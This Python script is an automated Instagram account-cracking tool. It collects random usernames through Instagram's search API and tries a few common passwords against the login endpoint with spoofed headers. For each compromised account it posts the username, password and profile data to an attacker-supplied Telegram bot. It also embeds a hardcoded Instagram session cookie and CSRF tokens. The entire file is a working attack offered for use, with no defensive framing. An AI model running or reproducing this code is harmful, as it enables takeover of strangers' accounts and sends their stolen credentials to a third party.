import requests
import time
import random
from user_agent import *

Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'

print(Z+"□"*30)
print(f'{C}Enlighten Our tool ')
print(f'{X}Tele: @B11HB')
print(F+"□"*30)
start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'

idd = input(f'{Y}Enter ID : ')
tok = input(f'{B}Enter TOKEN : ')

tt=0
alp=0
se = requests.Session()
pas = ['123456', 'qqwweerr', 'qwerty123456']

def into(user,password):
	headers = {
	    'User-Agent': str(generate_user_agent()),
	    'Accept': '*/*',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Referer': 'https://www.instagram.com/',
	    'X-IG-App-ID': '936619743392459',
	    'X-ASBD-ID': '359341',
	    'X-Requested-With': 'XMLHttpRequest',
	    'X-CSRFToken': '4HRH59eUBgvkQ2woVDz8GMixOWhMfpaz',
	    'X-IG-WWW-Claim': '0',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Dest': 'empty',
	}
	
	params = {
	    'username': user,
	}
	
	re = requests.get(
	    'https://www.instagram.com/api/v1/users/web_profile_info/',
	    params=params,
	    cookies=se.cookies,
	    headers=headers,
	).json()
	try:
		name = re['data']['user']['full_name']
		folo = re['data']['user']['edge_followed_by']['count']
		fing = re['data']['user']['edge_follow']['count']
		post = re['data']['user']['highlight_reel_count']
		bio = re['data']['user']['biography']
		idi = re['data']['user']['id']
		
	except:
		name = folo = fing = post = bio = uid = 'غير معلوم'
		
	
	tit = f'''
GOOD INSTA 😎
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
User: {user}
Paaaword: {password}
Nema: {name}
Follower: {folo}
Following: {fing}
Post: {post}
Bio: {bio}
ID: {idi}
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
Dev : 𝑨𝑳𝑰𝑾𝑬 ⌯ @B11HB'''
	
	requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text="+str(tit))
	

def jj(user):
	global tt, alp
	for password in pas:
		try:
			url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
			
			timestamp = str(int(time.time()))
			
			payload = {
			    'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}",
			    'caaF2DebugGroup': "0",
			    'isPrivacyPortalReq': "false",
			    'loginAttemptSubmissionCount': "1",
			    'optIntoOneTap': "false",
			    'queryParams': "{}",
			    'trustedDeviceRecords': "{}",
			    'username': user,
			    'jazoest': "21779"
			}
			
			
			headers = {
			    'User-Agent': generate_user_agent(),
			    'X-IG-App-ID': "936619743392459",
			    'X-CSRFToken': "2200epo78KSP3BprSdSCqy",
			    'X-Requested-With': "XMLHttpRequest",
			    'X-Instagram-AJAX': "1024243520",
			    'Referer': "https://www.instagram.com/",
			    'Accept-Language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
			    'Cookie': "csrftoken=2200epo78KSP3BprSdSCqy; mid=Z4uq9gABAAFYmN5s_Lyi3VyVsuou; ig_did=B1AD601A-0781-4CA1-A3AE-C2E7B3BCA658; ig_nrcb=1"
			}
			response = requests.post(url, data=payload, headers=headers).text
			
			
			if '"authenticated":true,' in str(response):
				alp+=1
				into(user,password)
			else:
				tt+=1
				ui = f"""
{G} ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
{F} Good Insta : {alp}
{Z} Bad Insta  : {tt}
{B} User       : {user}
{Y} Password   : {password}
{G} ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
"""
				print(ui)

		except:
			print('')
def aai():
    
	url = 'https://www.instagram.com/api/v1/web/search/topsearch/'

	
	headers = {
	    'user-agent': str(generate_user_agent()),
	    'x-ig-app-id': '1217981644879628',
	    'x-asbd-id': '198387',
	    'x-csrftoken': 'I4hjfts2xgq2CCwq8TsGRpojfJOF66nd',
	    'referer': 'https://www.instagram.com/',
	 'cookie': 'datr=YbUOaOzavyq07XTsg1dIv_2f; ig_did=2ABEA96F-7F9A-4221-97EE-CF6CCE8B79C6; mid=aA61YQAEAAGydkdn5S0pOdTS5OrR; ig_nrcb=1; ps_l=1; ps_n=1; ds_user_id=401823354; sessionid=401823354%3AlH7ZctXuGlKTF3%3A11%3AAYdCwHuG-2CtS055vspMEOlK7xo6yQ1W17Qp4fryIA; csrftoken=IfncrCHszry7IFDHjFeybwJl5uaglBc5; rur="CLN\\054401823354\\0541782572847:01fee4133083c9c2dc7fddb02a3047573f2c6fea045e9ea5580b3130b8138430de30687b"; wd=360x390',
	    'accept': '*/*',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	while True:
	    time.sleep(1.5)
	    try:
	        ali = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(5))
	
	        params = {
	            'context': 'blended',
	            'include_reel': 'true',
	            'query': ali,
	            'rank_token': '0.5881129747956786',
	            'search_session_id': '02ac477a-414d-426e-8074-cfb5763791c4',
	            'search_surface': 'web_top_search',
	        }
	
	        
	        res = se.get(url, headers=headers, params=params)
	        data = res.json()
	
	       
	        user = data['users'][0]['user']['username']
	        jj(user)
	        
	    except Exception as e:
	        print(f'Erorr')
aai()